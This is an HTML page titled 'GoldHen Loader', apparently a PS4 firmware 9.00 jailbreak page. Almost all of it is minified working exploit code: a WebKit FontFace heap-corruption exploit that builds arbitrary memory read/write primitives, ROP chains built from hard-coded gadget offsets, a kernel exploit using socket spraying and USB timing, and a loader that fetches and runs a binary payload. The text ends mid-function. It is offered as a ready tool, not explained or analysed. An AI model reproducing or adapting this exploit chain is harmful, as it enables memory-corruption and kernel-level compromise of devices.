<html><head><style>body{margin:0;padding:0;background:#1451ae}#wrapper{position:absolute;width:calc(48px * 2);margin:50vh 50%;transform:translate(-50%,-50%)}#wrapper div{width:48px;height:48px;float:left;text-align:center;line-height:4.5}svg{width:70%}.progress{color:#fff;overflow:hidden;position:fixed;top:60%;left:50%;font-size:25px;font-family:sans-serif;transform:translate(-50%,-50%)}</style><meta charset="utf-8"><title>GoldHen Loader</title></head><body onload="setTimeout(poc,500)"><div id="wrapper"><div id="triangle"><svg viewBox="0 0 129 115"xmlns="http://www.w3.org/2000/svg"><defs/><path d="M64.5 0L129 115H0L64.5 0zm0 24.531L20.489 103h88.021L64.5 24.531z"fill="#FFF"/></svg></div><div id="circle"><svg viewBox="0 0 129 129"xmlns="http://www.w3.org/2000/svg"><defs/><path d="M64.5 0C100.122 0 129 28.878 129 64.5S100.122 129 64.5 129 0 100.122 0 64.5 28.878 0 64.5 0zm0 12C35.505 12 12 35.505 12 64.5S35.505 117 64.5 117 117 93.495 117 64.5 93.495 12 64.5 12z"fill="#FFF"/></svg></div><div id="cross"><svg viewBox="0 0 110 110"xmlns="http://www.w3.org/2000/svg"><defs/><path d="M101 .515L109.485 9l-46 46 46 46-8.485 8.485-46-46-46 46L.515 101l46-46-46-46L9 .515l46 46 46-46z"fill="#FFF"/></svg></div><div id="square"><svg viewBox="0 0 113 113"xmlns="http://www.w3.org/2000/svg"><defs/><path d="M113 0v113H0V0h113zm-12 12H12v89h89V12z"fill="#FFF"/></svg></div></div><div id="progress"class="progress">Loading Exploits...</div><script>function disableUSB(){var a=new XMLHttpRequest;a.open("POST","./usboff",!0),a.send(null)}function ShutDown(){var a=new XMLHttpRequest;a.open("POST","./sleep",!0),a.send(null)}function enableUSB(){var a=new XMLHttpRequest;a.open("POST","./usbon",!0),a.send(null)}function USBWait(){var a=new XMLHttpRequest;return a.onreadystatechange=function(){a.readyState==XMLHttpRequest.DONE&&(wait=a.response)},a.open("POST","/usbwait",!1),a.send(null),wait}function sleep(a){return new Promise(i=>setTimeout(i,a))}function hen(){progress.innerHTML="Loading Goldhen...";var a=new XMLHttpRequest;a.responseType="arraybuffer",a.open("GET","goldhen.bin"),a.send(),a.onreadystatechange=function(){if(4==a.readyState){PLD=a.response;var i=chain.syscall(477,0,4*PLD.byteLength,7,4098,-1,0),r=p.array_from_address(i,4*PLD.byteLength),t=new Uint8Array(4-a.response.byteLength%4%4),e=new Uint8Array(a.response.byteLength+t.byteLength);e.set(new Uint8Array(a.response),0),e.set(t,a.response.byteLength);var n=new Uint32Array(e.buffer);r.set(n,0);var s=p.malloc(16);chain.call(libKernelBase.add32(OFFSET_lk_pthread_create),s,0,i,0),progress.innerHTML="Done",ShutDown()}}}function int64(a,i){return this.low=a>>>0,this.hi=i>>>0,this.add32inplace=function(a){var i=((this.low>>>0)+a&4294967295)>>>0,r=this.hi>>>0;i<this.low&&r++,this.hi=r,this.low=i},this.add32=function(a){var i=((this.low>>>0)+a&4294967295)>>>0,r=this.hi>>>0;return i<this.low&&r++,new int64(i,r)},this.sub32=function(a){var i=((this.low>>>0)-a&4294967295)>>>0,r=this.hi>>>0;return i>this.low&4294967295&&r--,new int64(i,r)},this.sub32inplace=function(a){var i=((this.low>>>0)-a&4294967295)>>>0,r=this.hi>>>0;i>this.low&4294967295&&r--,this.hi=r,this.low=i},this.and32=function(a){return new int64(this.low&a,this.hi)},this.and64=function(a,i){return new int64(this.low&a,this.hi&i)},this.toString=function(a){var i=(this.low>>>0).toString(16),r=(this.hi>>>0).toString(16);return 0==this.hi?i:r+(i=zeroFill(i,8))},this}function zeroFill(a,i){return(i-=a.toString().length)>0?new Array(i+(/\./.test(a)?2:1)).join("0")+a:a+""}function zeroFill(a,i){return(i-=a.toString().length)>0?new Array(i+(/\./.test(a)?2:1)).join("0")+a:a+""}const stack_sz=262144,reserve_upper_stack=65536,stack_reserved_idx=16384;var chain,kchain,kchain2,SAVED_KERNEL_STACK_PTR,KERNEL_BASE_PTR,webKitBase,webKitRequirementBase,libSceLibcInternalBase,libKernelBase;window.rop=function(){return this.stackback=p.malloc32(65544),this.stack=this.stackback.add32(65536),this.stack_array=this.stackback.backing,this.retval=this.stackback.add32(262144),this.count=1,this.branches_count=0,this.branches_rsps=p.malloc(512),this.clear=function(){this.count=1,this.branches_count=0;for(var a=1;a<49152;a++)this.stack_array[a+16384]=0},this.pushSymbolic=function(){return this.count++,this.count-1},this.finalizeSymbolic=function(a,i){i instanceof int64?(this.stack_array[16384+2*a]=i.low,this.stack_array[16384+2*a+1]=i.hi):(this.stack_array[16384+2*a]=i,this.stack_array[16384+2*a+1]=0)},this.push=function(a){this.finalizeSymbolic(this.pushSymbolic(),a)},this.push_write8=function(a,i){this.push(gadgets["pop rdi"]),this.push(a),this.push(gadgets["pop rsi"]),this.push(i),this.push(gadgets["mov [rdi], rsi"])},this.fcall=function(a,i,r,t,e,n,s){return null!=i&&(this.push(gadgets["pop rdi"]),this.push(i)),null!=r&&(this.push(gadgets["pop rsi"]),this.push(r)),null!=t&&(this.push(gadgets["pop rdx"]),this.push(t)),null!=e&&(this.push(gadgets["pop rcx"]),this.push(e)),null!=n&&(this.push(gadgets["pop r8"]),this.push(n)),null!=s&&(this.push(gadgets["pop r9"]),this.push(s)),8&this.stack.add32(8*this.count).low&&this.push(gadgets.ret),this.push(a),this},this.call=function(a,i,r,t,e,n,s){return this.fcall(a,i,r,t,e,n,s),this.write_result(this.retval),this.run(),p.read8(this.retval)},this.syscall=function(a,i,r,t,e,n,s){return this.call(window.syscalls[a],i,r,t,e,n,s)},this.get_rsp=function(){return this.stack.add32(8*this.count)},this.write_result=function(a){this.push(gadgets["pop rdi"]),this.push(a),this.push(gadgets["mov [rdi], rax"])},this.write_result4=function(a){this.push(gadgets["pop rdi"]),this.push(a),this.push(gadgets["mov [rdi], eax"])},this.jmp_rsp=function(a){this.push(window.gadgets["pop rsp"]),this.push(a)},this.run=function(){p.launch_chain(this),this.clear()},this.KERNEL_BASE_PTR_VAR,this.set_kernel_var=function(a){this.KERNEL_BASE_PTR_VAR=a},this.rax_kernel=function(a){this.push(gadgets["pop rax"]),this.push(this.KERNEL_BASE_PTR_VAR),this.push(gadgets["mov rax, [rax]"]),this.push(gadgets["pop rsi"]),this.push(a),this.push(gadgets["add rax, rsi"])},this.write_kernel_addr_to_chain_later=function(a){this.push(gadgets["pop rdi"]);var i=this.pushSymbolic();return this.rax_kernel(a),this.push(gadgets["mov [rdi], rax"]),i},this.kwrite8=function(a,i){this.rax_kernel(a),this.push(gadgets["pop rsi"]),this.push(i),this.push(gadgets["mov [rax], rsi"])},this.kwrite4=function(a,i){this.rax_kernel(a),this.push(gadgets["pop rdx"]),this.push(i),this.push(gadgets["mov [rax], edx"])},this.kwrite2=function(a,i){this.rax_kernel(a),this.push(gadgets["pop rcx"]),this.push(i),this.push(gadgets["mov [rax], cx"])},this.kwrite1=function(a,i){this.rax_kernel(a),this.push(gadgets["pop rcx"]),this.push(i),this.push(gadgets["mov [rax], cl"])},this.kwrite8_kaddr=function(a,i){this.rax_kernel(i),this.push(gadgets["mov rdx, rax"]),this.rax_kernel(a),this.push(gadgets["mov [rax], rdx"])},this};var textArea=document.createElement("textarea");const OFFSET_wk_vtable_first_element=17101072,OFFSET_WK_memset_import=680,OFFSET_WK___stack_chk_fail_import=376,OFFSET_WK_psl_builtin_import=3432,OFFSET_WKR_psl_builtin=211872,OFFSET_WK_setjmp_gadget_one=17214711,OFFSET_WK_setjmp_gadget_two=32301523,OFFSET_WK_longjmp_gadget_one=17214711,OFFSET_WK_longjmp_gadget_two=32301523,OFFSET_libcint_memset=325648,OFFSET_libcint_setjmp=767420,OFFSET_libcint_longjmp=767510,OFFSET_WK2_TLS_IMAGE=59670560,OFFSET_lk___stack_chk_fail=130912,OFFSET_lk_pthread_create=152848,OFFSET_lk_pthread_join=44960;var handle,random_path,ex_info,nogc=[],syscalls={},gadgets={},wk_gadgetmap={ret:50,"pop rdi":3249808,"pop rsi":128214,"pop rdx":39020,"pop rcx":415671,"pop r8":11512433,"pop r9":4334961,"pop rax":334354,"pop rsp":320147,"mov [rdi], rsi":27883808,"mov [rdi], rax":17271031,"mov [rdi], eax":10052796,"cli ; pop rax":354040,sti:2079692,"mov rax, [rax]":147916,"mov rax, [rsi]":5310112,"mov [rax], rsi":32495760,"mov [rax], rdx":21129858,"mov [rax], edx":3899364,"add rax, rsi":24131966,"mov rdx, rax":5502209,"add rax, rcx":195533,"mov rsp, rdi":33849442,"mov rdi, [rax + 8] ; call [rax]":7675623,infloop:32255,"mov [rax], cl":814767},wkr_gadgetmap={"xchg rdi, rsp ; call [rsi - 0x79]":1930480},wk2_gadgetmap={"mov [rax], rdi":1048023,"mov [rax], rcx":2924234,"mov [rax], cx":22707538},hmd_gadgetmap={"add [r8], r12":179425},ipmi_gadgetmap={"mov rcx, [rdi] ; mov rsi, rax ; call [rcx + 0x30]":13387};function userland(){p.launch_chain=function(r){r.push(window.gadgets["pop rdi"]),r.push(s),r.push(libSceLibcInternalBase.add32(767510)),p.write8(a,e),textArea.scrollLeft=0,p.write8(h.add32(0),window.gadgets.ret),p.write8(h.add32(16),r.stack),p.write8(h.add32(64),p.read8(s.add32(64))),p.write8(a,n),textArea.scrollLeft=0,p.write8(a,i)},p.malloc=function(a){var i=new Uint8Array(65536+a);window.nogc.push(i);var r=p.read8(p.leakval(i).add32(16));return r.backing=i,r},p.malloc32=function(a){var i=new Uint8Array(65536+4*a);window.nogc.push(i);var r=p.read8(p.leakval(i).add32(16));return r.backing=new Uint32Array(i.buffer),r},p.stringify=function(a){for(var i=new Uint8Array(a.length+1),r=0;r<a.length;r++)i[r]=255&a.charCodeAt(r);return window.nogc.push(i),p.read8(p.leakval(i).add32(16))},p.array_from_address=function(a,i){var r=new Uint32Array(4096),t=p.leakval(r).add32(16);return p.write8(t,a),p.write4(t.add32(8),i),p.write4(t.add32(12),1),nogc.push(r),r},p.readstr=function(a){for(var i="",r=0;;r++){var t=p.read1(a.add32(r));if(0==t)break;i+=String.fromCharCode(t)}return i};var a=p.read8(p.leakval(textArea).add32(24)),i=p.read8(a);for(var r in webKitBase=p.read8(i).sub32(17101072),(libSceLibcInternalBase=p.read8(t(webKitBase.add32(680)))).sub32inplace(325648),(libKernelBase=p.read8(t(webKitBase.add32(376)))).sub32inplace(130912),(webKitRequirementBase=p.read8(t(webKitBase.add32(3432)))).sub32inplace(211872),wk_gadgetmap)window.gadgets[r]=webKitBase.add32(wk_gadgetmap[r]);for(var r in wkr_gadgetmap)window.gadgets[r]=webKitRequirementBase.add32(wkr_gadgetmap[r]);function t(a){var i=65535&p.read4(a),r=p.read4(a.add32(2));return 9727!=i?0:a.add32(6+r)}var e=p.malloc32(512),n=p.malloc32(512),s=p.malloc32(64),h=p.malloc32(64);p.write8(e.add32(0),e),p.write8(e.add32(168),webKitBase.add32(32301523)),p.write8(e.add32(16),s),p.write8(e.add32(8),libSceLibcInternalBase.add32(767420)),p.write8(e.add32(456),webKitBase.add32(17214711)),p.write8(n.add32(0),n),p.write8(n.add32(168),webKitBase.add32(32301523)),p.write8(n.add32(16),h),p.write8(n.add32(8),libSceLibcInternalBase.add32(767510)),p.write8(n.add32(456),webKitBase.add32(17214711));var o,d=new Uint8Array(4096),c=p.leakval(d).add32(16),l=p.read8(c);p.write8(c,window.libKernelBase),p.write4(c.add32(8),262144);for(var u=0;u<262144;u++)if(114==d[u]&&100==d[u+1]&&108==d[u+2]&&111==d[u+3]&&99==d[u+4]){o=u;break}p.write4(c.add32(8),o+32);var _=new Uint32Array(1),w=new Uint8Array(_.buffer);for(u=0;u<o;u++)if(72==d[u]&&199==d[u+1]&&192==d[u+2]&&73==d[u+7]&&137==d[u+8]&&202==d[u+9]&&15==d[u+10]&&5==d[u+11]){w[0]=d[u+3],w[1]=d[u+4],w[2]=d[u+5],w[3]=d[u+6];var f=_[0];window.syscalls[f]=window.libKernelBase.add32(u)}if(p.write8(c,l),0==(chain=new rop).syscall(20).low)for(alert("webkit exploit failed. Try again if your ps4 is on fw 9.00.");;);}function run_hax(){userland(),0!=chain.syscall(23,0).low?(enableUSB(),kernel()):hen()}function kernel(){extra_gadgets(),kchain_setup(),object_setup(),trigger_spray()}function load_prx(a){var i=chain.syscall(594,p.stringify(`/${random_path}/common/lib/${a}`),0,handle,0);0!=i.low&&alert("failed to load prx/get handle "+a),p.write8(ex_info,424),0!=(i=chain.syscall(608,p.read4(handle),0,ex_info)).low&&alert("failed to get module info from handle");var r=p.read8(ex_info.add32(272));return 0!=p.read4(ex_info.add32(284))&&("libSceWebKit2.sprx"==a?r.sub32inplace(59670560):alert(a+", tlssize is non zero. this usually indicates that this module has a tls phdr with real data. You can hardcode the imgage to base offset here if you really wish to use one of these.")),r}function extra_gadgets(){var a=(handle=p.malloc(488)).add32(4),i=handle.add32(20);ex_info=i.add32(64),p.write8(a,44),chain.syscall(602,0,i,a),random_path=p.readstr(i);var r=load_prx("libSceIpmi.sprx"),t=load_prx("libSceHmd.sprx"),e=load_prx("libSceWebKit2.sprx");for(var n in hmd_gadgetmap)window.gadgets[n]=t.add32(hmd_gadgetmap[n]);for(var n in wk2_gadgetmap)window.gadgets[n]=e.add32(wk2_gadgetmap[n]);for(var n in ipmi_gadgetmap)window.gadgets[n]=r.add32(ipmi_gadgetmap[n]);for(var n in window.gadgets)p.read8(window.gadgets[n]),chain.fcall(window.syscalls[203],window.gadgets[n],16);chain.run()}function kchain_setup(){const a=28478968,i=3222592,r=3857979;SAVED_KERNEL_STACK_PTR=p.malloc(512),KERNEL_BASE_PTR=SAVED_KERNEL_STACK_PTR.add32(8),p.write8(KERNEL_BASE_PTR,new int64(4286636900,4294967295)),kchain=new rop,kchain2=new rop,chain.fcall(window.syscalls[203],kchain.stackback,262144),chain.fcall(window.syscalls[203],kchain2.stackback,262144),chain.fcall(window.syscalls[203],SAVED_KERNEL_STACK_PTR,16),chain.run(),kchain.count=0,kchain2.count=0,kchain.set_kernel_var(KERNEL_BASE_PTR),kchain2.set_kernel_var(KERNEL_BASE_PTR),kchain.push(gadgets["pop rax"]),kchain.push(SAVED_KERNEL_STACK_PTR),kchain.push(gadgets["mov [rax], rdi"]),kchain.push(gadgets["pop r8"]),kchain.push(KERNEL_BASE_PTR),kchain.push(gadgets["add [r8], r12"]),kchain.kwrite1(a,1),kchain.push(gadgets.sti);var t=kchain.write_kernel_addr_to_chain_later(i),e=kchain.write_kernel_addr_to_chain_later(2079049);kchain.push(gadgets["pop rdi"]),kchain.push(6),kchain.push(gadgets["pop rsi"]),kchain.push(gadgets["mov rsp, rdi"]),kchain.push(gadgets["pop rdx"]),kchain.push(14),kchain.push(gadgets["pop rcx"]),kchain.push(0),kchain.push(gadgets["pop r8"]),kchain.push(0);var n=kchain.get_rsp();kchain.pushSymbolic(),kchain.push(gadgets["pop rsi"]),kchain.push(2147745843),kchain.push(gadgets["pop rdi"]),kchain.push(kchain2.stack);var s=kchain.get_rsp();kchain.pushSymbolic(),kchain.finalizeSymbolic(t,n),kchain.finalizeSymbolic(e,s),kchain2.kwrite2(6449268,37008),kchain2.kwrite1(2765,235),kchain2.kwrite1(2561021,235),kchain2.kwrite1(2561089,235),kchain2.kwrite1(2561213,235),kchain2.kwrite1(2561281,235),kchain2.kwrite1(2561709,235),kchain2.kwrite1(2562909,235),kchain2.kwrite1(2563117,235),kchain2.kwrite1(a,0);var h=kchain2.write_kernel_addr_to_chain_later(1561856),o=kchain2.write_kernel_addr_to_chain_later(i);kchain2.push(gadgets["pop rdi"]),kchain2.push(6),kchain2.push(gadgets["pop rsi"]);var d=kchain2.get_rsp();kchain2.pushSymbolic(),kchain2.push(gadgets["pop rdx"]),kchain2.push(14),kchain2.push(gadgets["pop rcx"]),kchain2.push(0),kchain2.push(gadgets["pop r8"]),kchain2.push(0);var c=kchain2.get_rsp();kchain2.pushSymbolic(),kchain2.finalizeSymbolic(h,d),kchain2.finalizeSymbolic(o,c),kchain2.kwrite4(1168,0),kchain2.kwrite1(1218,235),kchain2.kwrite2(1209,37008),kchain2.kwrite2(1205,37008),kchain2.kwrite1(6662,235),kchain2.kwrite4(527245,0),kchain2.kwrite2(2338500,59792),kchain2.kwrite1(2340479,235),kchain2.kwrite4(2235200,3284152648),kchain2.kwrite1(1467178,55),kchain2.kwrite1(1467181,55),kchain2.kwrite4(17827104,2),kchain2.kwrite8_kaddr(17827112,313261),kchain2.kwrite4(17827148,1),kchain2.kwrite4(r,3284607503);var l=kchain2.write_kernel_addr_to_chain_later(r);kchain2.push(gadgets["pop rdi"]),kchain2.push(2147811379);var u=kchain2.get_rsp();kchain2.pushSymbolic(),kchain2.finalizeSymbolic(l,u),kchain2.rax_kernel(3770769),kchain2.push(gadgets["mov rdx, rax"]),kchain2.push(gadgets["pop rsi"]),kchain2.push(SAVED_KERNEL_STACK_PTR),kchain2.push(gadgets["mov rax, [rsi]"]),kchain2.push(gadgets["pop rcx"]),kchain2.push(16),kchain2.push(gadgets["add rax, rcx"]),kchain2.push(gadgets["mov [rax], rdx"]),kchain2.push(gadgets["pop rdi"]);var _=kchain2.pushSymbolic();kchain2.push(gadgets["mov [rdi], rax"]),kchain2.push(gadgets.sti),kchain2.push(gadgets["pop rsp"]);var w=kchain2.get_rsp();kchain2.pushSymbolic(),kchain2.finalizeSymbolic(_,w)}function object_setup(){var a=chain.syscall(477,16384,49152,3,4112,4294967295,0),i=a.add32(16384),r=a.add32(32768);if(16384!=a.low)for(alert("enomem: "+a);;);p.write8(a,r),p.write8(a.add32(104),i),p.write8(i.sub32(121),gadgets["cli ; pop rax"]),p.write8(i.add32(0),gadgets["xchg rdi, rsp ; call [rsi - 0x79]"]),p.write8(i.add32(8),kchain.stack),p.write8(i.add32(16),gadgets["mov rcx, [rdi] ; mov rsi, rax ; call [rcx + 0x30]"]),p.write8(r.add32(48),gadgets["mov rdi, [rax + 8] ; call [rax]"]),chain.syscall(203,a,49152)}var trigger_spray=function(){for(var a=432,i=p.malloc(1728),r=0;r<a;r++)chain.fcall(window.syscalls[362]),chain.write_result4(i.add32(4*r));chain.run();var t=p.array_from_address(i,a),e=chain.syscall(97,2,1,0);if(e.low<256||e.low>=512)for(alert("invalid socket");;);var n=p.malloc(32);p.write8(n.add32(0),e),p.write4(n.add32(8),131071),p.write4(n.add32(12),0),p.write8(n.add32(16),0),p.write8(n.add32(24),0);for(r=0;r<a;r++)chain.fcall(window.syscalls[363],t[r],n,1,0,0,0);chain.run();for(r=18;r<a;r+=2)chain.fcall(window.syscalls[6],t[r]);chain.run(),window.progress.innerHTML="Activating ExFatHax USB...",usbWaitTime=1*USBWait(),sleep(usbWaitTime).then(()=>{for(var i=1;i<a;i+=2)chain.fcall(window.syscalls[6],t[i]);if(chain.run(),0==chain.syscall(23,0).low){chain.fcall(window.syscalls[73],16384,49152),chain.fcall(window.syscalls[325]),chain.run();var r=chain.syscall(477,0,16384,7,4096,4294967295,0),e=p.array_from_address(r,4096);e[0]=3e3,e[1]=4270409728,e[2]=54365512,e[3]=251658240,e[4]=1213580037,e[5]=2336810377,e[6]=2515011710,e[7]=3892314112,e[8]=373,e[9]=53876223,e[10]=2336751616,e[11]=210749,e[12]=1066092544,e[13]=1962902856,e[14]=1032669419,e[15]=669,e[16]=4181035848,e[17]=1207959554,e[18]=52565387,e[19]=2336751616,e[20]=14084114,e[21]=2370306048,e[22]=171837,e[23]=898320384,e[24]=740,e[25]=85297992,e[26]=1207959555,e[27]=3118994059,e[28]=1207959552,e[29]=40058253,e[30]=2336751616,e[31]=180021,e[32]=361449472,e[33]=712,e[34]=3893529416,e[35]=156,e[36]=2050854216,e[37]=1207959554,e[38]=44709259,e[39]=2336751616,e[40]=174869,e[41]=311117824,e[42]=32744,e[43]=25552896,e[44]=3277651968,e[45]=1832749384,e[46]=1207959554,e[47]=40779009,e[48]=21495808,e[49]=159549,e[50]=1023494144,e[51]=624,e[52]=1899823432,e[53]=1207959554,e[54]=41041153,e[55]=21495808,e[56]=168765,e[57]=1023494144,e[58]=660,e[59]=1698496840,e[60]=1207959554,e[61]=40254721,e[62]=21495808,e[63]=165693,e[64]=1023494144,e[65]=648,e[66]=2302476616,e[67]=1207959554,e[68]=42614017,e[69]=21495808,e[70]=166717,e[71]=1023494144,e[72]=588,e[73]=1027408200,e[74]=3271557122,e[75]=3850979413,e[76]=283935560,e[77]=607422792,e[78]=609519944,e[79]=3977641736,e[80]=1207959553,e[81]=1265942661,e[82]=1220708680,e[83]=1212170379,e[84]=796180613,e[85]=678988616,e[86]=607927112,e[87]=2336754292,e[88]=3229960192,e[89]=3974831476,e[90]=410553160,e[91]=1962902856,e[92]=2139834605,e[93]=2084259856,e[94]=3799320612,e[95]=4279255239,e[96]=1224736767,e[97]=823163533,e[98]=835858934,e[99]=2769682377,e[100]=1207959553,e[101]=1561379971,e[102]=2303219139,e[103]=3223326693,e[104]=4294911304,e[105]=571473918,e[106]=1032538304,e[107]=456,e[108]=2425358279,e[109]=1204261008,e[110]=1217433604,e[111]=898320568,e[112]=428,e[113]=142051656,e[114]=1695565767,e[115]=3342633800,e[116]=2430023,e[117]=1204224e3,e[118]=2303197208,e[119]=474466104,e[120]=3091763344,e[121]=2100661064,e[122]=1207959553,e[123]=3340793737,e[124]=3343394887,e[125]=1204224256,e[126]=44,e[127]=2005747945,e[128]=361449524,e[129]=336,e[130]=2314348872,e[131]=2336763991,e[132]=92981,e[133]=1452099584,e[134]=3609806853,e[135]=3242786697,e[136]=2168981735,e[137]=59855,e[138]=1049184256,e[139]=3400,e[140]=571408385,e[141]=1438866880,e[142]=266701128,e[143]=625524768,e[144]=4294901759,e[145]=1220551183,e[146]=20594059,e[147]=130482176,e[148]=12828721,e[149]=893225800,e[150]=3338665985,e[151]=3284152583,e[152]=1032538112,e[153]=304,e[154]=3224438727,e[155]=2336751811,e[156]=76605,e[157]=822593280,e[158]=1208009664,e[159]=10894731,e[160]=2277965824,e[161]=2039297,e[162]=2425419313,e[163]=503678919,e[164]=3375431711,e[165]=2278002832,e[166]=2039305,e[167]=2425410097,e[168]=507414471,e[169]=3375431711,e[170]=222859408,e[171]=65536,e[172]=4290781711,e[173]=61205,e[174]=3223326464,e[175]=4294911304,e[176]=571473918,e[177]=1032538304,e[178]=220,e[179]=3224438727,e[180]=222822595,e[181]=65536,e[182]=1572872719,e[183]=1937339331,e[184]=1601004916,e[185]=1886614899,e[186]=1600417381,e[187]=1935763568,e[188]=1885287013,e[189]=1935631730,e[190]=6516345,e[191]=1953724787,e[192]=1918856549,e[193]=1836413797,e[194]=1752194917,e[195]=845509473,e[196]=1937339136,e[197]=1601004916,e[198]=1970496882,e[199]=1885300077,e[200]=1702060392,e[201]=2425356339,e[202]=0,e[203]=0,e[204]=1018096,e[205]=0,e[206]=3076464,e[207]=0,e[208]=101872,e[209]=0,e[210]=102128,e[211]=0,e[212]=40190224,e[213]=0,e[214]=619056,e[215]=0,e[216]=4206176,e[217]=0,e[218]=22151432,e[219]=0,e[220]=22151424,e[221]=0,e[222]=4599072,e[223]=0,e[224]=4599292,e[225]=0,e[226]=6445472,e[227]=0,e[228]=6449360,e[229]=0,e[230]=6446528,e[231]=0,e[232]=6447760,e[233]=0,e[234]=6448928,e[235]=0,chain.fcall(window.syscalls[203],r,16384),chain.fcall(r,p.read8(KERNEL_BASE_PTR)),chain.fcall(window.syscalls[73],r,16384),chain.run(),setTimeout(hen,150)}else disableUSB(),alert("Failed. Please try again"),p.write8(0,0)})},PAGE_SIZE=16384,SIZEOF_CSS_FONT_FACE=184,HASHMAP_BUCKET=208,STRING_OFFSET=20,SPRAY_FONTS=4106,GUESS_FONT=8602845184,NPAGES=20,INVALID_POINTER=0,HAMMER_FONT_NAME="font8",HAMMER_NSTRINGS=700;function poc(){for(var a=new ArrayBuffer(8),i=new Uint8Array(a),r=new Uint32Array(a),t=new Float64Array(a),e=[],n=0;n<SPRAY_FONTS;n++)e.push(new FontFace("font1","",{}));var s=new FontFace("font2","url(data:text/html,)",{});e.push(s);var h=[];for(n=0;n<512;n++)h.push(new Array(31));h[256][0]=1.5,h[257][0]={},h[258][0]=1.5;var o={a:h[256],b:new Uint32Array(1),c:!0},d={},c=1e7;function p(a){for(var i="",r=0;r<8;r++)i+=String.fromCharCode(a%256),a=(a-a%256)/256;return i}function l(a,i){void 0===i&&(i=0);for(var r=0,t=7;t>=0;t--)r=256*r+a.charCodeAt(i+t);return r}var u=[];function _(a,i){var r=i+"\0".repeat(a-STRING_OFFSET-8-i.length)+c++;return d[r]=1,u.push(r),r}var w=GUESS_FONT,f=!0,g=0,k=0;window.ffses={};do{var m=p(NPAGES+2);for(n=0;n<NPAGES;n++)m+=p(w+n*PAGE_SIZE);m+=p(INVALID_POINTER);for(n=0;n<256;n++)_(HASHMAP_BUCKET,m);ffses["search_"+ ++k]=new FontFaceSet(e);var v=_(HASHMAP_BUCKET,m),S=null,b=null;for(n=0;n<SPRAY_FONTS;n++)if(e[n].family="search"+k,v.substr(0,m.length)!=m){S=n;var A=v.substr(0,m.length);for(n=1;n<=NPAGES;n++)if(A.substr(8*n,8)!=m.substr(8*n,8)){b=l(m.substr(8*n,8));break}0==g++&&(w=b+2*PAGE_SIZE,b=null);break}(f=!f)&&(w+=NPAGES*PAGE_SIZE)}while(null===b);m="";m+=p(26),m+=p(b),m+=p(b+SIZEOF_CSS_FONT_FACE);for(n=0;n<19;n++)m+=p(INVALID_POINTER);for(n=0;n<256;n++)_(HASHMAP_BUCKET,m);var E=[];for(n=0;;n++){ffses["ffs_leak_"+n]=new FontFaceSet([e[S],e[S+1],s]);var x=_(HASHMAP_BUCKET,m);E.push(_(HASHMAP_BUCKET,m)),e[S].family="evil2",e[S+1].family="evil3";var y=l(x.substr(x.length-8));if(y<281474976710656)break}function T(a,i){var r="";r+="0000",r+="ÿ\0\0\0ÿÿÿÿ",r+=p(a),r+=p(2147483668),m="",m+=p(29),m+=p(b),m+=p(b+SIZEOF_CSS_FONT_FACE),m+=p(b+2*SIZEOF_CSS_FONT_FACE);for(var t=0;t<18;t++)m+=p(INVALID_POINTER);for(t=0;t<256;t++)_(HASHMAP_BUCKET,m);ffses[i]=new FontFaceSet([e[S],e[S+1],e[S+2],s]);_(HASHMAP_BUCKET,m);var n=_(HASHMAP_BUCKET,r);return e[S].family=i+"_evil1",e[S+1].family=i+"_evil2",e[S+2].family=i+"_evil3",E.push(n),n.length<1e3?T(a,i+"_"):n}var F=T(y,"ffs3");for(n=0;n<1e5;n++)_(128,"");var K=[];for(n=0;n<65536;n++)K.push({value:1094927426}),K.push({value:o});Object.defineProperties({},K);for(n=F.indexOf("BDCA\0\0þÿ");;n+=16)if(66==F.charCodeAt(n)&&68==F.charCodeAt(n+1)&&67==F.charCodeAt(n+2)&&65==F.charCodeAt(n+3)&&0==F.charCodeAt(n+4)&&0==F.charCodeAt(n+5)&&254==F.charCodeAt(n+6)&&255==F.charCodeAt(n+7)&&14==F.charCodeAt(n+24)){var R=l(F,n+32);break}var P=T(R,"ffs4"),B=l(P,16),N=l(P,24),C=l(T(B,"ffs5"),8),O=T(N,"ffs6");for(n=0;n<8;n++)i[n]=O.charCodeAt(n);var L=r[0],U=r[1];r[0]=65536,r[1]=0,h[257][1]={},h[257][0]=t[0],r[0]=b+12*SIZEOF_CSS_FONT_FACE|0,r[1]=(b-b%4294967296)/4294967296,h[256][n]=t[0],pp_s="",pp_s+=p(56);for(n=0;n<12;n++)pp_s+=p(b+n*SIZEOF_CSS_FONT_FACE);var H="";H+="0000",H+=p(INVALID_POINTER),H+=p(C),H+='\0\0\0\0"\0\0\0';var I=[];for(n=0;n<12;n++)I.push(e[S+n]);I.push(s);var M=[e[S+12]];for(n=0;n<5;n++)M.push(new FontFace(HAMMER_FONT_NAME,"url(data:text/html,)",{}));for(n=0;n<HAMMER_NSTRINGS;n++)_(HASHMAP_BUCKET,pp_s);ffses.ffs7=new FontFaceSet(I),_(HASHMAP_BUCKET,pp_s),ffses.ffs8=new FontFaceSet(M);var j=_(HASHMAP_BUCKET,H);E.push(j);for(n=0;n<13;n++)e[S+n].family="hammer"+n;function D(a){return h[257][32]=a,t[0]=h[258][0],4294967296*r[1]+r[0]}var G=new Uint32Array(8),z=new Uint8Array(1),W=new Uint32Array(8),V={obj:null},Z=D(z),q=D(V);r[0]=L,r[1]=U,i[6]=7;var X,Y,$={jscell:t[0],butterfly:!0,buffer:G,size:22136};function J(a,i){i[4]=0|a,i[5]=a/4294967296|0}function Q(a,i){J(a,G),G[6]=i}window.addrof=function(a){return V.obj=a,(i=W)[4]+4294967296*i[5];var i},window.fakeobj=function(a){return J(a,W),V.obj},window.read_mem_s=function(a,i){return Q(a,i),""+z},window.read_mem_b=function(a,i){Q(a,i);var r=new Uint8Array(i);return r.set(z),r},window.read_mem_as_string=function(a,i){for(var r=read_mem_b(a,i),t="",e=0;e<r.length;e++)t+=String.fromCharCode(r[e]);return t},window.ref_mem=function(a,i){return Q(a,i),z},window.read_mem=function(a,i){Q(a,i);for(var r=[],t=0;t<i;t++)r.push(z[t]);return r},window.write_mem=function(a,i){Q(a,i.length);for(var r=0;r<i.length;r++)z[r]=i[r]},window.read_ptr_at=function(a){for(var i=0,r=read_mem(a,8),t=7;t>=0;t--)i=256*i+r[t];return i},window.write_ptr_at=function(a,i){for(var r=[],t=0;t<8;t++)r.push(255&i),i/=256;write_mem(a,r)},X=D($)+16,r[0]=X,r[1]=(X-X%4294967296)/4294967296,h[258][0]=t[0],(Y=h[257][32])[4]=Z,Y[5]=(Z-Z%4294967296)/4294967296,$.buffer=W,Y[4]=q,Y[5]=(q-q%4294967296)/4294967296,Y=null,function(){var 